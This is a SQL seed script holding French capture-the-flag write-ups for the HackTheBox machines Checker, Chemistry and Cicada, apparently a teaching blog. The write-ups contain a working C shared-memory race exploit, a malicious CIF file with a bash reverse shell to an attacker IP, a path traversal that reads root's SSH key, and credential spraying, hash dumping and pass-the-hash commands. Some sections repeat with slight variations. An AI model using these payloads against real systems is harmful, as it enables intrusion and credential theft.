# Commande type pour lancer l''exploit de fuite de fichier via PHP Filter Chain
uv run filters_chain_oracle_exploit.py --verb PUT \
  --file /backup/home_backup/home/reader/.google_authenticator \
  --target http://checker.htb/ajax/page/8/save-draft \
  --parameter html \
  --headers ''{"Cookie": "...", "X-CSRF-TOKEN": "..."}''
```

Après extraction de la seed (`DVDBRAODLCWF7I2ONA4K5LQLUE`), je génère le code de vérification en synchronisant l''heure locale avec celle du serveur (extraite via le header HTTP `Date`).

```bash
# Génération du code TOTP synchronisé
oathtool -b --totp "DVDBRAODLCWF7I2ONA4K5LQLUE" --now="$(curl -sI http://checker.htb | grep Date | cut -d'' '' -f3-)"
```

---

### Escalade de Privilèges : Root

L''énumération des privilèges `sudo` montre que l''utilisateur `reader` peut exécuter un script spécifique en tant que **root**.

```bash
reader@checker:~$ sudo -l
(ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *
```

#### Analyse du binaire `check_leak`
Le script `check-leak.sh` appelle un binaire compilé `check_leak`. L''analyse via **Ghidra** révèle le workflow suivant :
1. Le binaire récupère le hash d''un utilisateur en base de données.
2. Il compare ce hash avec une liste de hashes fuités dans `/opt/hash-checker/leaked_hashes.txt`.
3. Si une correspondance est trouvée, il crée un segment de **Shared Memory** (mémoire partagée) avec les permissions `0666` (world-writable).
4. Il écrit un message de log dans cette mémoire.
5. **Vulnérabilité :** Le programme effectue un `sleep(1)` avant de relire la mémoire pour construire une commande `mysql` via `popen()`.

> **Schéma Mental :**
> 1. **Race Condition :** Il existe une fenêtre d''une seconde entre l''écriture en mémoire et sa lecture.
> 2. **Shared Memory Poisoning :** Puisque la mémoire est accessible à tous (`0666`), je peux écraser le contenu durant le `sleep`.
> 3. **Command Injection :** Le binaire utilise `strstr` pour chercher un délimiteur `>` et exécute ce qui suit dans un shell. En injectant `; command ;`, j''obtiens l''exécution de code en tant que **root**.

#### Exploitation de la Race Condition
Je compile un exploit en C qui boucle pour tenter de deviner la clé de la mémoire partagée (basée sur `rand()` et le `timestamp` actuel) et y injecter un payload de **Command Injection**.

```c
// d.c - Exploit de poisoning de mémoire partagée
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/shm.h>

int main() {
    time_t now = (unsigned int) time(NULL);
    srand(now);
    int key = rand() % 0xfffff; // Même logique de génération de clé que le binaire
    int shmid = shmget(key, 0x400, 0x3b6);
    char *h_shm = shmat(shmid, (void *) 0, 0);
    // Injection du payload pour créer un shell SUID
    snprintf(h_shm, 0x400, "Leaked hash detected at whenever > ''; cp /bin/bash /tmp/rootbash; chmod 6777 /tmp/rootbash;#");
    shmdt(h_shm);
    return 0;
}
```

**Exécution de l''attaque :**

```bash
# Terminal 1 : Boucle d''empoisonnement
while true; do ./d; done

# Terminal 2 : Déclenchement du binaire via sudo
sudo /opt/hash-checker/check-leak.sh bob

# Terminal 1 : Récupération du shell root
/tmp/rootbash -p
```

L''utilisation de `bob` est nécessaire car son hash est présent dans `leaked_hashes.txt`, ce qui déclenche le chemin de code vulnérable utilisant la **Shared Memory**. Le flag `root.txt` est alors accessible.

---

### Phase 3 : Élévation de Privilèges & Domination (Root)

#### Énumération des vecteurs privilégiés

Une fois mon accès établi en tant qu''utilisateur **reader**, je commence par inspecter mes privilèges **sudo**. L''utilisateur dispose d''une configuration permissive permettant d''exécuter un script spécifique sans mot de passe.

```bash
reader@checker:~$ sudo -l
User reader may run the following commands on checker:
    (ALL) NOPASSWD: /opt/hash-checker/check-leak.sh *
```

Le script `/opt/hash-checker/check-leak.sh` est un wrapper **Bash** qui source un fichier `.env` (inaccessible en lecture), nettoie l''argument fourni pour ne garder que les caractères alphanumériques, puis appelle un binaire compilé nommé `check_leak`.

#### Analyse du binaire `check_leak`

En analysant le binaire avec **Ghidra**, je décompose la logique d''exécution suivante :
1.  Le programme récupère les identifiants de base de données via des variables d''environnement.
2.  Il extrait le **hash** de l''utilisateur fourni en argument depuis la base de données.
3.  Il compare ce **hash** avec une liste de compromissions dans `/opt/hash-checker/leaked_hashes.txt`.
4.  Si une correspondance est trouvée, il utilise la fonction `write_to_shm` pour stocker une alerte dans la **Shared Memory**.
5.  Le programme effectue un `sleep(1)`.
6.  Il appelle `notify_user`, qui lit la **Shared Memory**, parse le contenu et exécute une commande `mysql` via `popen()` pour récupérer l''email de l''utilisateur.

La vulnérabilité majeure réside dans l''utilisation de la **Shared Memory** (SHM). Le binaire utilise `shmget` avec les permissions `0x3b6` (soit `0666` en octal), ce qui rend le segment de mémoire **world-writable**.

> **Schéma Mental : Race Condition sur Shared Memory**
> 1. **Root** lance le binaire -> Le hash est trouvé -> Écriture dans la SHM.
> 2. **Root** entre en `sleep(1)` -> Fenêtre d''opportunité.
> 3. **Attaquant** identifie la clé SHM -> Écrase le contenu de la SHM avec une **Command Injection**.
> 4. **Root** se réveille -> Lit la SHM empoisonnée -> Exécute la charge utile via `popen()`.

#### Exploitation de la Race Condition

Le binaire génère sa clé SHM de manière prédictible en utilisant `srand(time(NULL))`. Je peux donc synchroniser un exploit en C pour calculer la même clé et injecter mon payload durant la seconde de pause du binaire.

**Exploit C (`exploit.c`) :**
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <sys/shm.h>

int main() {
    // Synchronisation avec le seed du binaire root
    time_t now = (unsigned int) time(NULL);
    srand(now);
    int key = rand() % 0xfffff;

    // Accès au segment de mémoire partagée
    int shmid = shmget(key, 0x400, 0x3b6);
    if (shmid < 0) return 1;

    char *h_shm = shmat(shmid, (void *) 0, 0);
    
    // Injection de commande via le parsing du caractère ''>''
    // Payload : copie de bash avec SUID
    snprintf(h_shm, 0x400, "Leaked hash detected at X > ''; cp /bin/bash /tmp/rootbash; chmod 6777 /tmp/rootbash; #");
    
    shmdt(h_shm);
    return 0;
}
```

**Exécution de l''attaque :**

Je compile l''exploit et je le lance dans une boucle infinie pour garantir la collision lors de la fenêtre du `sleep`.

```bash
# Terminal 1 : Boucle d''empoisonnement
reader@checker:/tmp$ gcc exploit.c -o exploit
reader@checker:/tmp$ while true; do ./exploit; done

# Terminal 2 : Déclenchement du binaire privilégié
# L''utilisateur ''bob'' est connu pour avoir un hash fuité
reader@checker:~$ sudo /opt/hash-checker/check-leak.sh bob
```

Une fois l''erreur SQL affichée (indiquant que l''injection a perturbé la requête `mysql` légitime), je vérifie la présence de mon binaire **SUID**.

```bash
reader@checker:~$ /tmp/rootbash -p
rootbash-5.1# id
uid=1000(reader) gid=1000(reader) euid=0(root) egid=0(root) groups=0(root)
```

#### Beyond Root : Analyse Post-Exploitation

L''analyse du binaire `check_leak` révèle plusieurs couches de mauvaises pratiques de sécurité :
1.  **Insecure Shared Memory Permissions** : L''utilisation de `0666` permet à n''importe quel utilisateur local de modifier des données traitées par un processus privilégié.
2.  **Predictable Random Seed** : L''utilisation de `time(NULL)` comme graine pour `srand` rend les ressources IPC (Inter-Process Communication) prédictibles.
3.  **Unsafe Function Call** : L''utilisation de `popen()` avec une chaîne de caractères construite dynamiquement à partir d''une source non fiable (la SHM modifiable) est une invitation directe à la **Command Injection**.
4.  **ASAN (AddressSanitizer)** : Le binaire semble avoir été compilé avec des options d''instrumentation (visibles via les appels `__asan_report_load8`), ce qui est inhabituel pour un environnement de production et peut parfois faciliter le debugging d''exploits mémoire.

La remédiation consisterait à utiliser des permissions SHM restreintes (`0600`), à valider strictement le contenu lu en mémoire avant traitement, et à privilégier des API d''exécution plus sûres comme `execve()` en passant les arguments sous forme de tableau plutôt que via un shell.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'SQL', 'Privilege Escalation'],
  'L''énumération commence par un scan **Nmap** complet pour identifier la surface d''attaque. La machine expose trois ports : **SSH (22)** et deux services **HTTP (80, 8080)**. Le port 80 renvoie un **403 Forbidden**, suggérant un **Virtual Hosting**. En...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-checker-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Chemistry
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Chemistry',
  'htb-chemistry',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### Phase 1 : Reconnaissance & Brèche Initiale

Ma méthodologie débute par une phase d''énumération classique pour identifier la surface d''attaque. Le scan de ports révèle deux services exposés, dont un serveur web non standard sur le port 5000.

#### 1. Énumération des services

J''utilise **nmap** pour cartographier les ports ouverts et identifier les versions des services.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.38

# Scan détaillé des services identifiés
nmap -p 22,5000 -sCV 10.10.11.38
```

**Résultats clés :**
*   **Port 22/TCP** : **OpenSSH 8.2p1** (Ubuntu).
*   **Port 5000/TCP** : Serveur HTTP utilisant **Werkzeug 3.0.3** et **Python 3.9.5**. Cela indique une application **Flask**.

L''interface web présente un outil nommé **Chemistry CIF Analyzer**, conçu pour traiter des fichiers **Crystallographic Information File (CIF)**. Après avoir créé un compte utilisateur, j''accède à un tableau de bord permettant l''upload de ces fichiers.

> **Schéma Mental :**
> Port 5000 (HTTP) -> Application Flask -> Fonctionnalité d''upload de fichiers CIF -> Traitement côté serveur via une librairie Python spécialisée -> Vecteur potentiel d''**Insecure Deserialization** ou d''injection.

#### 2. Analyse de la stack technique et vulnérabilité

L''application utilise la librairie Python **pymatgen** (Python Materials Genomics) pour parser les fichiers CIF. Une recherche sur les vulnérabilités liées au parsing de fichiers CIF dans cet écosystème pointe vers la **CVE-2024-23346**.

Cette vulnérabilité réside dans le module `pymatgen/symmetry/settings.py`. La fonction de traitement utilise `eval()` de manière non sécurisée sur des chaînes de caractères extraites du fichier CIF, notamment lors de la gestion des transformations de symétrie. Bien que les développeurs aient tenté de restreindre les `__builtins__`, l''utilisation de `eval()` sur une entrée utilisateur non filtrée permet une **Arbitrary Code Execution**.

#### 3. Exploitation de la CVE-2024-23346

Pour valider la vulnérabilité, je prépare un fichier CIF malveillant. Le payload exploite la réflexion Python pour remonter la hiérarchie des classes et atteindre le module `os` afin d''exécuter des commandes système.

**Payload de test (ICMP Exfiltration) :**
Le but est de déclencher un `ping` vers ma machine d''attaque pour confirmer l''exécution.

```python
_space_group_magn.transform_BNS_Pp_abc  ''a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("ping -c 1 10.10.14.6");0,0,0''
```

**Étapes de l''attaque :**
1.  Upload du fichier CIF modifié sur le **Dashboard**.
2.  Déclenchement de l''exécution en cliquant sur "View" pour forcer le parsing du fichier.
3.  Réception du paquet ICMP sur mon interface `tun0`.

#### 4. Obtention du Reverse Shell

Une fois l''exécution confirmée, je remplace le payload par un **Bash Reverse Shell**. Étant donné que l''environnement peut être restreint, j''utilise le chemin absolu `/bin/bash`.

**Fichier CIF malveillant final :**
```text
data_poc
_audit_creation_method "Pymatgen CIF Parser Exploit"
loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]
_space_group_magn.transform_BNS_Pp_abc  ''a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \"/bin/bash -i >& /dev/tcp/10.10.14.6/443 0>&1\"");0,0,0''
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P n'' m a''"
```

J''écoute sur le port 443 et je visualise le fichier sur l''application :

```bash
# Sur ma machine d''attaque
nc -lnvp 443

# Stabilisation du shell après connexion
script /dev/null -c /bin/bash
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

Je récupère un accès initial en tant qu''utilisateur **app**.

> **Schéma Mental :**
> Upload CIF -> Trigger `CifParser` -> Appel de `eval()` sur le champ `transform_BNS_Pp_abc` -> Évasion du sandbox Python via `__subclasses__` -> Appel de `os.system()` -> **Reverse Shell**.

---

### Énumération Interne & Post-Exploitation

Une fois l''accès initial obtenu en tant qu''utilisateur **app**, j''entame une phase d''énumération locale pour identifier les vecteurs de mouvement latéral. Le système contient deux utilisateurs réels avec un **Bash shell** : `app` et `rosa`.

L''application **Flask** est située dans `/home/app`. L''analyse du fichier `app.py` révèle l''utilisation d''une base de données **SQLite** pour la gestion des utilisateurs.

```bash
# Inspection de la configuration de la base de données
cat app.py | grep SQLALCHEMY_DATABASE_URI
# Sortie : app.config[''SQLALCHEMY_DATABASE_URI''] = ''sqlite:///database.db''

# Énumération de la base de données avec sqlite3
sqlite3 /home/app/instance/database.db
sqlite> .tables
sqlite> select * from user;
```

La table `user` contient plusieurs entrées. Je relève particulièrement le hash de l''utilisateur **rosa** : `63ed86ee9f624c7b14f1d4f43dc251a5`. L''analyse du code source confirme que l''application utilise l''algorithme **MD5** sans **salt** pour le stockage des mots de passe.

> **Schéma Mental :**
> Accès initial (`app`) -> Extraction de la base SQLite -> Récupération de Hash MD5 -> **Offline Cracking** -> Pivot vers l''utilisateur `rosa`.

### Mouvement Latéral : Pivot vers Rosa

Le hash MD5 de **rosa** est vulnérable aux attaques par dictionnaire. En utilisant **CrackStation** ou **Hashcat**, le mot de passe est rapidement identifié : `unicorniosrosados`.

```bash
# Tentative de pivot via su ou SSH
su - rosa
# Password: unicorniosrosados
```

L''utilisateur **rosa** dispose des privilèges de lecture sur son propre répertoire personnel, me permettant de récupérer le premier flag (`user.txt`).

### Énumération pour l''Escalade de Privilèges (Root)

En inspectant les services réseaux locaux, je remarque un service écoutant sur le port **8080** (localhost uniquement).

```bash
netstat -tnlp
# Local Address: 127.0.0.1:8080
```

Une vérification des processus montre que ce service tourne avec les privilèges **root** et exécute une application Python située dans `/opt/monitoring_site/app.py`. Cependant, une règle **iptables** empêche l''utilisateur `app` (UID 1001) d''accéder à ce port. En tant que **rosa**, cette restriction ne s''applique pas.

Pour analyser l''application confortablement, je mets en place un **SSH Tunneling** (Local Port Forwarding) :

```bash
# Depuis ma machine d''attaque
ssh -L 8888:127.0.0.1:8080 rosa@10.10.11.38
```

### Exploitation de CVE-2024-23334 (AIOHTTP Path Traversal)

L''application sur le port 8080 utilise la bibliothèque **AIOHTTP** version 3.9.1. Cette version spécifique est vulnérable à un **Path Traversal** (CVE-2024-23334) lorsque l''option `follow_symlinks` est activée sur une route statique.

L''application expose un répertoire `/assets/` qui pointe vers le dossier `static/` du serveur.

> **Schéma Mental :**
> Service interne (Root) -> **AIOHTTP 3.9.1** -> Route statique mal configurée -> **Directory Traversal** -> Lecture de fichiers sensibles (`/root/.ssh/id_rsa`).

Je teste la vulnérabilité en tentant de remonter l''arborescence pour lire la clé privée SSH de **root**.

```bash
# Payload de Path Traversal via curl
curl -s http://localhost:8888/assets/../../../../root/.ssh/id_rsa
```

La requête réussit et renvoie la **RSA Private Key**. Il ne reste plus qu''à l''utiliser pour obtenir un shell stable avec les privilèges maximaux.

```bash
# Accès final via SSH
nano root_key # Coller la clé
chmod 600 root_key
ssh -i root_key root@10.10.11.38
```

### Analyse Post-Mortem (Beyond Root)

L''analyse du code source dans `/opt/monitoring_site/app.py` confirme la vulnérabilité. La ligne incriminée est :
`app.router.add_static(''/assets/'', path=''static/'', follow_symlinks=True)`

L''activation de `follow_symlinks=True` dans cette version de **AIOHTTP** ne valide pas correctement les séquences `../`, permettant ainsi de sortir du répertoire `static/` et d''accéder à l''intégralité du **File System**.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois l''accès initial établi en tant qu''utilisateur **app**, mon objectif est de pivoter vers un compte avec des privilèges plus élevés, puis de compromettre totalement l''hôte.

#### 1. Escalade Horizontale : de app à rosa

L''énumération du système de fichiers révèle que l''application **Flask** utilise une base de données **SQLite** située dans `instance/database.db`. En analysant le code source de `app.py`, je confirme que les mots de passe sont stockés sous forme de hash **MD5** sans sel (salt).

```bash
# Extraction des hashs depuis la base SQLite
sqlite3 instance/database.db "SELECT username, password FROM user;"

# Résultats obtenus
admin:2861debaf8d99436a10ed6f75a252abf
rosa:63ed86ee9f624c7b14f1d4f43dc251a5
```

Le hash de l''utilisatrice **rosa** est rapidement cassé via **CrackStation** ou **Hashcat**, révélant le mot de passe : `unicorniosrosados`. Ce compte dispose d''un accès **SSH** et de privilèges étendus sur ses propres fichiers, me permettant de récupérer le premier flag.

---

#### 2. Escalade Verticale : de rosa à root

L''analyse des connexions réseau locales via `netstat -tnlp` montre un service écoutant exclusivement sur `127.0.0.1:8080`. Bien qu''une règle **IPTables** bloque l''utilisateur **app** (UID 1001), l''utilisateur **rosa** peut y accéder.

> **Schéma Mental : Exploitation de Service Interne via Tunneling**
> 1. **Identification** : Un service **AIOHTTP** tourne en tant que **root** sur le port 8080.
> 2. **Accessibilité** : Création d''un **SSH Tunnel** pour exposer le port local distant sur ma machine d''attaque.
> 3. **Vulnérabilité** : Utilisation d''une faille de **Path Traversal** connue sur cette version spécifique de la bibliothèque.
> 4. **Exfiltration** : Lecture de la clé privée **SSH** de **root** pour une compromission totale.

##### Mise en place du Tunnel SSH
```bash
ssh -L 8888:127.0.0.1:8080 rosa@10.10.11.38
```

##### Exploitation de la CVE-2024-23334 (AIOHTTP Path Traversal)
Le service utilise **AIOHTTP 3.9.1**. Cette version est vulnérable à un **Path Traversal** lorsque l''option `follow_symlinks=True` est activée sur une route statique. En observant les requêtes vers `/assets/`, je tente de sortir du répertoire racine de l''application.

```bash
# Lecture de la clé privée SSH de root via Path Traversal
curl -s --path-as-is "http://localhost:8888/assets/../../../../root/.ssh/id_rsa"
```

La requête réussit et m''affiche la **RSA Private Key**. Je l''enregistre localement, ajuste les permissions avec `chmod 600`, et me connecte en tant que **root**.

```bash
ssh -i root_id_rsa root@10.10.11.38
```

---

#### 3. Analyse Post-Exploitation : Beyond Root

L''examen du code source de l''application de monitoring dans `/opt/monitoring_site/app.py` confirme l''origine de la vulnérabilité. Le développeur a configuré la route statique de manière non sécurisée :

```python
# Extrait du code vulnérable dans /opt/monitoring_site/app.py
app.router.add_static(''/assets/'', path=''static/'', follow_symlinks=True)
```

**Analyse technique :**
*   **L''erreur de configuration** : L''argument `follow_symlinks=True` combiné à une validation insuffisante du chemin dans **AIOHTTP < 3.9.2** permet d''utiliser des séquences `../` pour remonter jusqu''à la racine du système de fichiers (`/`).
*   **Privilèges excessifs** : L''application tourne avec les privilèges **root**, ce qui signifie que le **Path Traversal** n''est limité par aucune restriction de permissions système (DAC), permettant la lecture de fichiers sensibles comme `/etc/shadow` ou les clés **SSH**.
*   **Isolation réseau** : La règle **IPTables** limitant l''accès au port 8080 suggère que l''administrateur était conscient du risque potentiel du service, mais a tenté de le sécuriser par l''obscurité et la segmentation plutôt que par une mise à jour logicielle.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Web', 'SQL', 'Privilege Escalation'],
  'Ma méthodologie débute par une phase d''énumération classique pour identifier la surface d''attaque. Le scan de ports révèle deux services exposés, dont un serveur web non standard sur le port 5000. J''utilise **nmap** pour cartographier les ports ouver...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-chemistry-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Cicada
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Cicada',
  'htb-cicada',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### 1. Reconnaissance & Scanning

L''énumération initiale commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque de la cible. Les résultats indiquent un **Windows Domain Controller** (DC) classique au sein du domaine `cicada.htb`.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 10.10.11.35

# Scan de services détaillé sur les ports identifiés
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV 10.10.11.35
```

Les services critiques identifiés sont :
*   **DNS (53)**, **Kerberos (88)**, **LDAP (389/636)** : Confirmation du rôle de **Domain Controller**.
*   **SMB (445)** : Vecteur potentiel pour l''énumération de partages.
*   **WinRM (5985)** : Vecteur d''accès à distance si des identifiants sont compromis.

J''ajoute immédiatement l''IP au fichier `/etc/hosts` pour faciliter les requêtes :
`10.10.11.35 CICADA-DC cicada.htb`

---

### 2. Énumération SMB & Information Disclosure

Je commence par tester l''accès anonyme sur **SMB**. Si l''accès anonyme strict est désactivé, le compte `guest` sans mot de passe est souvent activé par défaut sur certaines configurations.

```bash
# Test d''énumération des partages avec le compte guest
netexec smb CICADA-DC -u guest -p '''' --shares
```

L''énumération révèle deux partages non standards : `HR` et `DEV`. Le partage `HR` est accessible en lecture pour l''utilisateur `guest`. J''y récupère un fichier nommé `Notice from HR.txt`.

```bash
smbclient -N //10.10.11.35/HR
get "Notice from HR.txt"
```

Le contenu du fichier révèle une politique de mot de passe par défaut pour les nouveaux employés :
**Default Password :** `Cicada$M6Corpb*@Lp#nZp!8`

---

### 3. RID Cycling & User Discovery

Possédant un mot de passe par défaut, j''ai besoin d''une liste d''utilisateurs valides pour tenter un **Password Spraying**. J''utilise la technique du **RID Cycling** via **NetExec**. Cette méthode interroge l''**IPC$** pour énumérer les SIDs (Security Identifiers) et résoudre les noms d''utilisateurs.

```bash
# Extraction des utilisateurs via RID Brute Force
netexec smb CICADA-DC -u guest -p '''' --rid-brute | grep SidTypeUser | cut -d''\'' -f2 | cut -d'' '' -f1 > users.txt
```

> **Schéma Mental : De l''accès Guest au Password Spraying**
> `Accès Guest SMB` -> `Lecture de documents (HR)` -> `Extraction de mot de passe par défaut` -> `RID Cycling (énumération de la liste d''utilisateurs)` -> `Password Spraying (validation d''un compte actif)`.

---

### 4. Password Spraying & Mouvement Latéral (LDAP)

Je teste le mot de passe récupéré contre la liste d''utilisateurs fraîchement générée.

```bash
# Password Spraying sur SMB
netexec smb CICADA-DC -u users.txt -p ''Cicada$M6Corpb*@Lp#nZp!8'' --continue-on-success
```

Le compte `michael.wrightson` est valide. Bien que ce compte n''ait pas de privilèges administratifs ou d''accès **WinRM**, il me permet d''interroger l''**Active Directory** via **LDAP** de manière authentifiée.

```bash
# Énumération détaillée des objets utilisateurs via LDAP
netexec ldap CICADA-DC -u michael.wrightson -p ''Cicada$M6Corpb*@Lp#nZp!8'' --users
```

L''énumération **LDAP** révèle une information critique dans le champ **Description** de l''utilisateur `david.orelious` :
`Description: "Just in case I forget my password is aRt$Lp#7t*VQ!3"`

---

### 5. Accès au partage DEV & Extraction de Credentials

Avec les identifiants de `david.orelious`, je ré-énumère les partages **SMB**. Ce nouvel utilisateur a accès au partage `DEV`.

```bash
# Connexion au partage DEV
smbclient -U ''david.orelious%aRt$Lp#7t*VQ!3'' //10.10.11.35/DEV
get Backup_script.ps1
```

Le script **PowerShell** `Backup_script.ps1` contient des identifiants en clair utilisés pour automatiser des sauvegardes :
*   **User :** `emily.oscars`
*   **Password :** `Q!3@Lp#M6b*7t*Vt`

---

### 6. Brèche Initiale : Shell via WinRM

Je vérifie si `emily.oscars` possède les droits d''accès à distance. Le flag `(Pwn3d!)` de **NetExec** confirme l''accès administratif ou l''appartenance au groupe **Remote Management Users**.

```bash
# Validation des accès WinRM
netexec winrm CICADA-DC -u emily.oscars -p ''Q!3@Lp#M6b*7t*Vt''

# Obtention du premier shell
evil-winrm -i cicada.htb -u emily.oscars -p ''Q!3@Lp#M6b*7t*Vt''
```

Je suis désormais authentifié en tant que `emily.oscars` et je peux récupérer le premier flag dans `C:\Users\emily.oscars\Desktop\user.txt`.

---

### Énumération Interne & Mouvement Latéral

Une fois l''accès invité confirmé sur le **SMB**, ma priorité est d''identifier les vecteurs de mouvement latéral en exploitant les informations récoltées précédemment, notamment le mot de passe par défaut trouvé dans la note RH : `Cicada$M6Corpb*@Lp#nZp!8`.

#### 1. Extraction de la liste d''utilisateurs via RID Cycling

N''ayant pas encore de compte utilisateur valide pour interroger l''**Active Directory** via **LDAP**, j''utilise une technique de **RID Cycling** via le protocole **SMB**. Cette méthode permet d''énumérer les objets de sécurité (utilisateurs, groupes) en itérant sur les **Relative Identifiers**.

```bash
# Énumération des utilisateurs via RID Brute Force
netexec smb 10.10.11.35 -u guest -p '''' --rid-brute | grep "SidTypeUser" | cut -d''\'' -f2 | cut -d'' '' -f1 > users.txt
```

> **Schéma Mental :**
> Accès Guest SMB -> **RID Cycling** (Brute force d''IDs) -> Extraction des noms d''utilisateurs -> Constitution d''une **Wordlist** ciblée.

#### 2. Password Spraying & Premier Pivot

Avec ma liste d''utilisateurs et le mot de passe par défaut, j''effectue un **Password Spraying**. L''objectif est d''identifier un compte n''ayant pas encore modifié ses identifiants initiaux.

```bash
# Attaque par Password Spraying
netexec smb 10.10.11.35 -u users.txt -p ''Cicada$M6Corpb*@Lp#nZp!8'' --continue-on-success
```

Le compte `michael.wrightson` est compromis. Bien qu''il n''ait pas d''accès **WinRM**, ses privilèges me permettent d''interroger plus finement le **Domain Controller**.

#### 3. Énumération LDAP & Fuite de Données (Information Leakage)

J''utilise les identifiants de Michael pour effectuer une énumération complète des objets du domaine via **LDAP**. Une pratique courante mais dangereuse consiste à stocker des mots de passe dans les descriptions d''utilisateurs.

```bash
# Extraction des descriptions d''utilisateurs via LDAP
netexec ldap 10.10.11.35 -u michael.wrightson -p ''Cicada$M6Corpb*@Lp#nZp!8'' --users
```

L''attribut `Description` de l''utilisateur `david.orelious` contient un mot de passe en clair : `aRt$Lp#7t*VQ!3`.

#### 4. Analyse du partage DEV & Escalade vers Emily Oscars

En testant les accès de David Orelious, je découvre qu''il possède des droits de lecture sur le partage **SMB** `DEV`, inaccessible auparavant.

```bash
# Énumération du partage DEV
smbclient -U ''david.orelious%aRt$Lp#7t*VQ!3'' //10.10.11.35/DEV
get Backup_script.ps1
```

Le script **PowerShell** `Backup_script.ps1` révèle des identifiants codés en dur pour l''utilisateur `emily.oscars` :
- **Username** : `emily.oscars`
- **Password** : `Q!3@Lp#M6b*7t*Vt`

Ce compte est critique car il possède des droits d''accès à distance via **WinRM**.

```bash
# Connexion via Evil-WinRM
evil-winrm -i 10.10.11.35 -u emily.oscars -p ''Q!3@Lp#M6b*7t*Vt''
```

---

### Escalade de Privilèges : Backup Operators

#### 1. Analyse des privilèges (SeBackupPrivilege)

L''énumération des groupes de l''utilisateur `emily.oscars` montre son appartenance au groupe **Backup Operators**.

```powershell
whoami /priv
# Résultat : SeBackupPrivilege (Enabled), SeRestorePrivilege (Enabled)
```

Le privilège **SeBackupPrivilege** permet de lire n''importe quel fichier sur le système, en ignorant les **Access Control Lists (ACLs)**, afin de permettre la sauvegarde de données sensibles.

> **Schéma Mental :**
> **Backup Operators** -> **SeBackupPrivilege** -> Lecture forcée des fichiers verrouillés -> Extraction des **Registry Hives** -> Récupération des **NTLM Hashes** de l''Administrateur.

#### 2. Extraction des Hives du Registre

Pour compromettre totalement la machine, je vais extraire les ruches **SAM** et **SYSTEM**. Cela permettra de dumper les hashes locaux, dont celui de l''Administrateur.

```powershell
# Sauvegarde des ruches du registre
reg save hklm\sam sam
reg save hklm\system system

# Téléchargement vers la machine attaquante (via Evil-WinRM)
download sam
download system
```

#### 3. Extraction des Hashes & Pass-the-Hash

J''utilise **Impacket** pour extraire les secrets de la base **SAM** locale.

```bash
# Extraction des hashes NTLM
secretsdump.py -sam sam -system system LOCAL
```

Le hash NTLM de l''Administrateur est récupéré : `2b87e7c93a3e8a0ea4a581937016f341`. Je peux maintenant m''authentifier en tant qu''**Administrator** via la technique de **Pass-the-Hash**.

```bash
# Accès final en tant qu''Administrateur
evil-winrm -i 10.10.11.35 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

#### 4. Post-Exploitation : Extraction du NTDS.dit (Optionnel)

En tant qu''administrateur avec le **SeBackupPrivilege**, je peux également extraire la base de données de l''**Active Directory** (`ntds.dit`) pour compromettre l''intégralité du domaine.

```powershell
# Utilisation de Diskshadow pour créer un cliché instantané (Shadow Copy)
diskshadow /s script_backup.txt
# Copie du fichier ntds.dit depuis le volume exposé
robocopy /b E:\Windows\ntds . ntds.dit
```

```bash
# Extraction de tous les hashes du domaine
secretsdump.py -ntds ntds.dit -system system LOCAL
```

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois le shell obtenu en tant que `emily.oscars`, ma priorité est l''énumération des privilèges locaux et des appartenances aux groupes. L''utilisateur fait partie du groupe **Backup Operators**.

#### Énumération des Privilèges

Je vérifie les privilèges du jeton actuel :

```powershell
whoami /priv
net user emily.oscars
```

L''utilisateur possède la **SeBackupPrivilege** et la **SeRestorePrivilege**. Le groupe **Backup Operators** est critique car il permet de lire n''importe quel fichier sur le système, en ignorant les **Access Control Lists (ACL)**, afin d''effectuer des opérations de sauvegarde. Sur un **Domain Controller**, cela permet d''accéder aux ruches du registre et au fichier `ntds.dit`.

> **Schéma Mental :**
